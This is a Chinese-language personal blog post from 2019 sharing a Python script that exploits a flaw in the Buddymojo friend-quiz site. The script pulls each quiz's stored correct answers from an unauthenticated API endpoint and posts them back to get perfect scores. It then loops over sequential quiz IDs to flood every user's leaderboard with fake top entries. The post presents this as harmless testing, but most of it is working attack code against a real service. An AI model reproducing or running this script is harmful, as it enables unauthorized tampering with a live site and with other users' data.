---
title: 'xiiiiaoz: 一個BuddyMojo的腳本'
date: 2019-11-16 22:17:48
tags:
---

 
> 我不是之前那個`applepie5566`，我只是想公佈我刷榜的方法給有興趣的人知道。我也不是專業的，如果有人有更好的方法，歡迎交流。

November 16, 2019 

![](/images/xiiiiaoz_1.png)

# 啟發

不久以前有一個叫`applepie5566`的人在「[**Buddymojo 好友測驗**](http://cn.buddymojo.com)」網站，刷了幾乎所有人的榜，他出現後表示網頁有漏洞，他在不久後也寫了[**一個筆記**](https://www.notion.so/9598f83f50d44cd88f4a0010d76d3f91?pvs=21)公布方法，我就跟著方法寫了一個腳本。

# 參考

詳細網頁漏洞可以去看[**原作者的筆記](https://www.notion.so/9598f83f50d44cd88f4a0010d76d3f91?pvs=21)。**

# 腳本解析

腳本本身是用Python寫的，先安裝幾個必須的Module：

```shell
$ pip install requests
$ pip install json
```

import這些Modules：

```python
import requests
import json
```

## 擷取網站JSON

先設定好Query String Parameters和API的url，還有等等post用的data

```python
payloadf = {'userQuizId': #某人的ID, 
            'type': 'friend',
	          'stats': '1'}
data = {'userFullName': #你想輸入的名字,
        'userQuizId': #某人ID}
url = 'https://cn.buddymojo.com/api/v1/quiz/18'
```

> 💡 上面的`userQuizId`的取得方法一樣參考原作者的筆記

接下來送request到API

```python
req = requests.request('GET', url, params=payloadf)
text = json.loads(req.text)
print(text)
```

API回傳了一個JSON

```json
"data": {
        "id": "1256862",
        "userId": "5498716",
        "quizId": "18",
        "themeId": "3",
        "maxScore": "10",
        "status": "1",
        "encUserQuizId": "5gXY",
        "questions": 
            0: {question: "xiiiiaoz 是什麼類型的人?", options: Array(5), choosenOption: "1"},
            1: {question: "xiiiiaoz對什麼上癮 ?", options: Array(5), choosenOption: "1"},
            2: {question: "xiiiiaoz的生日是幾月?", options: Array(6), choosenOption: "1"},
            3: {question: "xiiiiaoz有什麼天賦？", options: Array(5), choosenOption: "1"},
            4: {question: "xiiiiaoz 喜歡和他／她的伴侶去哪裡?", options: Array(6), choosenOption: "1"},
            5: {question: "xiiiiaoz 想要一個什麼動物作為寵物?", options: Array(3), choosenOption: "1"},
            6: {question: "如果xiiiiaoz遇見一個精靈，xiiiiaoz會許什麼願望？", options: Array(6), choosenOption: "1"},
            7: {question: "在閒暇時間, xiiiiaoz 喜歡做什麼?", options: Array(7), choosenOption: "1"},
            8: {question: "xiiiiaoz最喜歡的超級英雄是誰?", options: Array(7), choosenOption: "1"},
            9: {question: "xiiiiaoz最喜歡什麼運動?", options: Array(7), choosenOption: "1"}
    }
```

## 搜集答案

可以看到questions是一個Array，我的第一個想法就是用loop把`choosenOption` (答案編號) 都抓下來，然後把它append到等等post的data裡

```python
questions = json.loads(req.text).get('data').get('questions')

for j, q in enumerate(questions):
		qval = q.get('choosenOption')
		data.update({'questions['+str(j)+'][choosenOption]': qval})
```

> 💡 enumerate()是Python內建物件，yield兩個迭代器


append完後data會長這樣

```python
{
    'userFullName': 'hi',
    'userQuizId': 1256862,
    'questions[0][choosenOption]': '1',
    'questions[1][choosenOption]': '1',
    'questions[2][choosenOption]': '1',
    'questions[3][choosenOption]': '1', 
    'questions[4][choosenOption]': '1',
    'questions[5][choosenOption]': '1',
    'questions[6][choosenOption]': '1', 
    'questions[7][choosenOption]': '1', 
    'questions[8][choosenOption]': '1', 
    'questions[9][choosenOption]': '1'
}
```

## 傳送Post

再設定另一個Query String Parameters

```python
payload = {'type': 'friend',
           'action': 'finish'}
```

把以上資訊打包並post給API

```python
requests.post(url, params=payload, data=data)
```

得到一個滿分問卷～～～

![](/images/xiiiiaoz_2.png)

## 迴圈跑問卷

這個步驟其實就很間單了，原作者有提到，這個網站的網址是設計成連續的，這其實也代表每個測驗的ID都是連續的。所以我們可以簡單地用for loop：

```python
for i in range(start, end):
    data = {'userFullName': name,
            'userQuizId': i}
    payloadf.update(userQuizId=i)

    try:
        req = requests.request('GET', url, params=payloadf)
        questions = json.loads(req.text).get('data').get('questions')

        for j, q in enumerate(questions):
            qval = q.get('choosenOption')
            data.update({'questions['+str(j)+'][choosenOption]': qval})

        reqi = requests.post(url, params=payload, data=data)
        print('sending post to userQuizId: ' + str(i))
    except:
        continue
```

用continue可以在`userQuizId`不存在的時候直接跳過

## 完成！

最後把它弄成multiprocess，但我就不公布方法了，因為寫得很醜...有興趣的人自己研究吧。

# 聲明

- **這個只是單純利用網頁漏洞做測試，沒有進行任何不法行為**
- **發現漏洞是`applepie5566`，我只是用他/她提供的方法做了腳本，並分享出去**
- **如果你覺得我很無聊的話，恩對我很無聊**

> The End

